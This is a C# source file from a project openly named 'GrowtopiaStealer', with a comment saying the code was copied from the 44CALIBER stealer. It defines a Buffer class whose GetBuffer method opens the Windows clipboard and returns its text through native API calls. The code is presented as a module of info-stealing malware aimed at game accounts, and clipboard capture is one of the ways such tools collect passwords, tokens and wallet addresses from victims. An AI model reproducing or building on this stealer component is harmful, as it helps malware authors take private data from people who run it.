using System;
using System.Runtime.InteropServices;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/blob/main/44CALIBER/Targets/Информация/Buffer.cs
{
    class Buffer
    {

        private const uint CF_UNICODETEXT = 0xD;

        public static string GetBuffer()
        {
            if (WinAPI.IsClipboardFormatAvailable(CF_UNICODETEXT) && WinAPI.OpenClipboard(IntPtr.Zero))
            {
                string data = string.Empty;
                IntPtr hGlobal = WinAPI.GetClipboardData(CF_UNICODETEXT);
                if (!hGlobal.Equals(IntPtr.Zero))
                {
                    IntPtr lpwcstr = WinAPI.GlobalLock(hGlobal);
                    if (!lpwcstr.Equals(IntPtr.Zero))
                    {
                        try
                        {
                            data = Marshal.PtrToStringUni(lpwcstr);
                            WinAPI.GlobalUnlock(lpwcstr);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }
                    }
                }
                WinAPI.CloseClipboard();
                return data;
            }
            return null;
        }
    }
}
